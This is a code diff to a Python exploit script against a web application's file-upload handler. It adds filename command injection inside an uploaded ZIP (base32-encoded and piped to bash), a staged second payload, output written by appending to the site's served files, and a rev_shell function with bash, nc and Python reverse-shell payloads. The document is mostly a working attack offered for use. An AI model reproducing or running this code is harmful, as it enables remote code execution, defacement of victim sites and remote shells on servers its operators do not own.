@@ -121,10 +121,12 @@ def p7m_name(cmd):
     return "z$(echo${IFS}" + b32 + "|base32${IFS}-d|bash).p7m"
 
 
-def zip_of(entry):
+def zip_of(entry, extra_name=None, extra_data=b""):
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
         z.writestr(entry, b"<?xml version='1.0'?><x/>")
+        if extra_name:
+            z.writestr(extra_name, extra_data)
     return buf.getvalue()
 
 
@@ -138,10 +140,16 @@ def multipart(field, fname, content):
 
 
 def upload(o, base, mid, pid, cmd):
-    """Upload the malicious ZIP the way the save handler expects:
-    field blob1, upload name *.zip, the .p7m injection as the ZIP entry."""
-    entry = p7m_name(cmd)
-    body, ct = multipart("blob1", "invoice.zip", zip_of(entry))
+    """Upload the malicious ZIP. To keep the injected .p7m FILENAME short (a long
+    base32 command would blow past the 255-byte filename limit and the entry
+    would never be created), the command is STAGED as a second ZIP entry and the
+    .p7m just finds+runs it. Both files extract into the import dir together, so
+    when decodeP7M runs the .p7m the stager script is already on disk."""
+    cfile = "sc" + os.urandom(5).hex()          # short staged-command filename
+    stager = f"bash $(find /var/www /tmp -name {cfile} 2>/dev/null|head -1) 2>/dev/null"
+    entry = p7m_name(stager)                     # short, base32-wrapped
+    zbytes = zip_of(entry, cfile, cmd.encode())
+    body, ct = multipart("blob1", "invoice.zip", zbytes)
     url = f"{base}/actions.php?op=save&id_module={mid}&id_plugin={pid}"
     st, resp = post(o, url, body,
                     {"Content-Type": ct, "X-Requested-With": "XMLHttpRequest"})
@@ -180,14 +188,17 @@ def run_cmd(o, base, mid, pid, _lhost, cmd, wait=9):
     served docroot. Returns the output after the marker."""
     marker = "SX" + os.urandom(4).hex()
     name = marker + ".xml"
-    # Shotgun the write: build the marker file once, copy it into every writable
-    # dir under the docroot + /tmp + every dir that currently holds one of our
-    # .p7m uploads. One of those is the dir op=download/getFileList reads.
+    # Write the output where nginx will serve it back: a self-updating app keeps
+    # its docroot files www-data-writable, so APPEND to known-served files and
+    # drop new files beside them. Also shotgun writable dirs as a fallback.
+    served = ["CHANGELOG.md", "composer.json", "package.json", "composer.lock",
+              "README.md", f"{marker}.txt"]
+    sh_served = " ".join(f'"{s}"' for s in served)
     payload = "\n".join([
-        f'{{ echo {marker}; {cmd}; }} > /tmp/.{marker} 2>/dev/null',
+        f'{{ echo {marker}; {cmd}; echo {marker}_END; }} > /tmp/.{marker} 2>/dev/null',
+        f'for f in {sh_served}; do cat /tmp/.{marker} >> "{DOCROOT}/$f" 2>/dev/null; done',
         'DIRS=$(find /var/www /tmp -maxdepth 7 -type d -writable 2>/dev/null)',
-        'PD=$(find /var/www /tmp -name "*.p7m" -exec dirname {} \\; 2>/dev/null)',
-        'for d in $DIRS $PD; do',
+        'for d in $DIRS; do',
         f'  cp /tmp/.{marker} "$d/{name}" 2>/dev/null',
         'done',
         f'rm -f /tmp/.{marker} 2>/dev/null',
@@ -195,19 +206,42 @@ def run_cmd(o, base, mid, pid, _lhost, cmd, wait=9):
     upload(o, base, mid, pid, payload)
     deadline = time.time() + wait
     while time.time() < deadline:
-        # 1) op=download streams file content from the sales import dir by index
+        # 1) read our marker appended to a served docroot file
+        for f in served:
+            body = get(o, base + "/" + f)
+            if marker in body and marker + "_END" in body:
+                seg = body.split(marker, 1)[1]
+                return seg.split(marker + "_END", 1)[0].strip()
+        # 2) op=download from the sales import dir by index
         for fid in range(0, 40):
             body = get(o, f"{base}/actions.php?op=download&id_module={mid}"
                           f"&id_plugin={pid}&file_id={fid}")
             if marker in body:
                 return body.split(marker, 1)[1].strip()
-        # 2) direct HTTP fetch if any served+writable dir got it
+        # 3) any served+writable KNOWN dir
         for _s, up in KNOWN:
             body = get(o, base + "/" + up + name)
             if marker in body:
                 return body.split(marker, 1)[1].strip()
         time.sleep(0.6)
     return ""
+
+
+def rev_shell(o, base, mid, pid, lhost, lport, method="bash"):
+    """Inject a reverse shell for a listener the operator runs (nc -lvnp PORT).
+    The definitive test of whether the box allows outbound at all."""
+    payloads = {
+        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+        "bash2": f"exec 5<>/dev/tcp/{lhost}/{lport}; cat <&5 | while read l; do $l >&5 2>&5; done",
+        "nc": f"nc {lhost} {lport} -e /bin/bash",
+        "py": ("python3 -c 'import socket,subprocess,os;s=socket.socket();"
+               f"s.connect((\"{lhost}\",{lport}));"
+               "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
+               "subprocess.call([\"/bin/bash\",\"-i\"])'"),
+    }
+    log("*", f"injecting {method} reverse shell -> {lhost}:{lport} "
+             "(catch it with: nc -lvnp " + str(lport) + ")")
+    upload(o, base, mid, pid, payloads.get(method, payloads["bash"]))
 
 
 def exec_confirmed(o, base, mid, pid, seconds=6):
